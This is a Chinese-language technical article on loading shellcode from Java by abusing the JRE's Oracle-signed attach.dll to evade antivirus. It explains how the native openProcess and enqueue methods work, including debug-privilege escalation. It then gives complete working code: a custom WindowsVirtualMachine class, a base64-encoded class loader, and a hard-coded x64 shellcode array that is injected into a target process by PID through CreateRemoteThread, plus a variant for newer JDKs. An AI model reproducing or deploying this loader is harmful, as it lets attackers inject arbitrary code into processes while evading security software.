# JVM加载Shellcode

## 基础知识

通过Java加载Shellcode一共有3中方式:

1. 编写JNI的DLL，在DLL的函数中加载shellcode，然后通过JNI加载并调用该函数。  
   >该方法需要落地一个自己编写的DLL，没有签名，容易被杀软查杀。
2. 通过JNA加载Windows的DLL，然后调用WIN32的API来加载shellcode。  
   >该方法需要目标JVM环境存在JNA的jar包，并且JNA在加载Windows的DLL会生成jni.dll，该文件没有签名，也容易被查杀。
3. JVM通过JNI调用attach.dll中的函数来实现shellcode的加载。
   >该方法使用的attach.dll是jre自带，并且有Oracle的合法签名，天然免杀。

## WindowsVirtualMachine类

sun.tools.attach.WindowsVirtualMachine类是tools.jar中一个类，它负责加载attach.dll并声明其中的Native方法。

```java
static native void init();

static native byte[] generateStub();

static native long openProcess(int pid) throws IOException;

static native void enqueue(long hProcess, byte[] stub, String cmd, String pipename, Object ... args) throws IOException;

//......

static {
    System.loadLibrary("attach");
    init();
    stub = generateStub();
}
```

> Native方法在attach.dll中实现，其中实现JVM加载Shellcode的关键是openProcess和enqueue方法。

## openProcess方法

openProcess只有1个参数，为目标进程的pid，作用是通过pid去获取目标进程的句柄。  
openProcess方法的实现主要分为3个步骤:

1. 当pid为当前进程时，通过DuplicateHandle函数复制当前进程的句柄返回。

   ```cpp
   //判断输入的pid是否和当前进程的相同
   if (pid == (jint) GetCurrentProcessId()) {
        //相同则直接得到当前进程的句柄
        hProcess = GetCurrentProcess();
        //尝试复制句柄，如果返回为0说明复制错误，句柄可能存在权限问题
        if (DuplicateHandle(hProcess, hProcess, hProcess, &hProcess,PROCESS_ALL_ACCESS, FALSE, 0) == 0) {
            //复制失败句柄为NULL
            hProcess = NULL;
        }
    }
   ```

2. 当pid不为当前进程时，通过OpenProcess函数获取目标进程的句柄。

   ```cpp
   hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
   ```

3. 当因为权限不够而无法获取目标进程句柄时，会通过自定义的doPrivilegedOpenProcess函数尝试提权再获取

   ```cpp
    hProcess = doPrivilegedOpenProcess(PROCESS_ALL_ACCESS, FALSE,(DWORD)pid);
   ```

   doPrivilegedOpenProcess函数的实现:
   >OpenProcessToken -> LookupPrivilegeValue -> AdjustTokenPrivileges  
   通过提升当前线程令牌特权为debug,再去获取目标进程的句柄。

## enqueue方法

enqueue方法有5个参数，第1个是目标进程的句柄，第2个是函数指针，剩下的参数是函数指针的参数，不重要。  
enqueue方法的主要实现分为3个步骤:

1. 将enqueue方法第2个参数后的参数组装成一个DataBlock结构体

   ```cpp
   typedef struct {
   GetModuleHandleFunc _GetModuleHandle;
   GetProcAddressFunc _GetProcAddress;
   char jvmLib[MAX_LIBNAME_LENGTH];
   char func1[MAX_FUNC_LENGTH];
   char func2[MAX_FUNC_LENGTH];
   char cmd[MAX_CMD_LENGTH];                
   char arg[MAX_ARGS][MAX_ARG_LENGTH];     
   char pipename[MAX_PIPE_NAME_LENGTH];
   } DataBlock;
   ```

2. 向第1个参数的目标进程申请可读可写的内存空间，将组装的DataBlock结构体数据写入

   ```cpp
   DataBlock data;
   DataBlock* pData;
   pData = (DataBlock*) VirtualAllocEx(hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE );
   WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&data, (SIZE_T)sizeof(DataBlock), NULL );
   ```

3. 向目标进程申请可读可写可执行的内存空间，将第2个参数的函数指针写入，并通过CreateRemoteThread创建远程线程来运行该函数指针,参数是DataBlock结构体。

   ```cpp
   pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
   WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL );
   hhThread = CreateRemoteThread( hProcess,  NULL,  0,  (LPTHREAD_START_ROUTINE) pCode,  pData,  0,NULL );
   ```
   
>执行shellcode并不需要参数，所以DataBlock结构体无关紧要，因此enqueue方法后3个参数直接为null即可。

## Java层加载Shellcode

WindowsVirtualMachine类的openProcess方法和enqueue方法的参数都是在Java层面传入的，因此可以通过这两个方法可以实现在Java层面完成shellcode的加载。  
WindowsVirtualMachine类位于tools.jar中，而tools.jar默认是不被JVM加载的，但是JNI的Native函数在调用的时候只检测发起调用的类限定名，并不检测发起调用类的ClassLoader，因此可以自定义一个WindowsVirtualMachine类来加载attach.dll，然后加载到JVM中，再调用这个自定义的WindowsVirtualMachine类来调用openProcess方法和enqueue方法。

```java
//自定义WindowsVirtualMachine类
package sun.tools.attach;

import java.io.IOException;

public class WindowsVirtualMachine {

    static native long openProcess(int pid) throws IOException;

    static native void enqueue(long hProcess, byte[] stub, String cmd, String pipename, Object ... args) throws IOException;
    
    static {
        System.loadLibrary("attach");
    }
}
```

```java
//通过Classloader将自定义WindowsVirtualMachine类加载
public class Main {

    public static void main(String[] args) throws Exception {
        byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQAIAoABQAWCAAXCgAYABkHABoHABsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZTsBAAtvcGVuUHJvY2VzcwEABChJKUoBAApFeGNlcHRpb25zBwAcAQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwABgAHAQAGYXR0YWNoBwAdDAAeAB8BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABAAFAAAAAAAEAAEABgAHAAEACAAAAC8AAQABAAAABSq3AAGxAAAAAgAJAAAABgABAAAABQAKAAAADAABAAAABQALAAwAAAEIAA0ADgABAA8AAAAEAAEAEAGIABEAEgABAA8AAAAEAAEAEAAIABMABwABAAgAAAAiAAEAAAAAAAYSArgAA7EAAAABAAkAAAAKAAIAAAALAAUADAABABQAAAACABU=");
        Class clazz = new Loader().load(classBytes);
        Method openProcess = clazz.getDeclaredMethod("openProcess",int.class);
        Method enqueue = clazz.getDeclaredMethod("enqueue",long.class,byte[].class,String.class,String.class,Object[].class);
        openProcess.setAccessible(true);
        enqueue.setAccessible(true);
        long targetHandle = (long)openProcess.invoke(null,24000); //目标进程pid 24000
        byte[] shellCode = new byte[]   //pop calc.exe
                {
                        (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                        (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                        (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                        (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                        (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                        (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                        (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                        (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                        (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                        (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                        (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                        (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                        (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                        (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                        (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                        (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                        (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                        (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                        (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                        (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                        (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                        (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                        (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                        (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                        (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                        (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                        (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                        (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                        (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                        (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                        (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                        (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                        (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                        (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                        (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
                };
        enqueue.invoke(null,targetHandle,shellCode,null,null,new Object[]{});
    }

    public static class Loader extends ClassLoader
    {
        public  Class load(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}
```

## 高版本JDK加载Shellcode

在高版本的JDK中，WindowsVirtualMachine类的内容已经被移至内置的jdk.attach模块中的VirtualMachineImpl类中，将自定义类修改，在低版本JDK编译即可。

```java
package sun.tools.attach;

import java.io.IOException;

public class VirtualMachineImpl {
    static native long openProcess(int pid) throws IOException;

    static native void enqueue(long hProcess, byte[] stub, String cmd, String pipename, Object ... args) throws IOException;

    static {
        System.loadLibrary("attach");
    }
}
```

## 参考

<https://macchiato.ink/hst/bypassav/JVMShellcodeLoader>  
<https://xz.aliyun.com/t/10075>
